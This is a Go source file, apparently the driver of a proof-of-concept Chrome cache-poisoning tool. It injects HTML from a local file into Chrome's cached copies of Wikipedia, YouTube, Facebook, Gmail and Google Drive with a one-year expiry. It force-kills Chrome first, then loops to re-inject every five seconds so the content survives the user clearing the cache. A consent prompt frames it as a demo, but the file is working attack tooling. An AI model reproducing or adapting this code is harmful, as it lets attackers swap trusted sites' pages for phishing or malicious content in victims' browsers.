package main 

import (
	"fmt"
	"time"
	"strings"
	"runtime"
	"io/ioutil"
	"os/exec"

	"chrome-poc/injector"
)

const (
	TestHtmlFilePath = "./test-files/test.html"
)

var (
	PageUrls = []string{
		"https://en.wikipedia.org/wiki/Main_Page",
		"https://www.youtube.com/",
		"https://www.facebook.com/",
		"https://mail.google.com/",
		"https://www.google.com/drive/",
	}
)

func readFile(path string) []byte {
	fileData, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}
	return fileData
}

func killProc(name string) {
	exec.Command("pkill", "-SIGKILL", name).Run()
}

func checkUserApproval() bool {
	fmt.Printf(
		"It'll replace web pages for urls:\n%v\n" +
		"NOTE: You can modify the list of test urls for injection in main.go\n\n" +
		"Do you want to inject code from %v into these web pages in Chrome?\n" +
		"yes/no\n", 
		PageUrls,
		TestHtmlFilePath,
	)

	for {
		var input string
		fmt.Scanln(&input)

		switch strings.ToLower(input) {
		case "yes": return true 
		case "no": return false 
		default:
			fmt.Println("Please enter 'yes' or 'no'")
		}
	}
}

func main() {
	fmt.Println("Chrome POC demo")

	if runtime.GOOS == "windows" {
		fmt.Println("Windows isn't supported")
		return 
	}

	if !checkUserApproval() {
		fmt.Println("Exiting...")
		return
	}

	testContent := readFile(TestHtmlFilePath)

	chromeInjector := injector.ChromeInjector{}
	chromeInjector.ExpireDate = time.Now().Add(time.Hour * 24 * 365)
	chromeInjector.Urls = PageUrls
	chromeInjector.Content = testContent
	chromeInjector.ContentType = "text/html"

	/* use this to reduce the size of the generated cache file */
	// chromeInjector.GzipContent()

	/* 
	kill the Chrome process to make sure 
	it isn't writing to those cache files right now
	*/
	killProc("Chrome")

	for {
		fmt.Println("\nInjecting cache data...")

		chromeInjector.Inject()

		/* if the user has cleaned up the cache files, we can re-inject them every 5 seconds */
		time.Sleep(5 * time.Second)
	}
}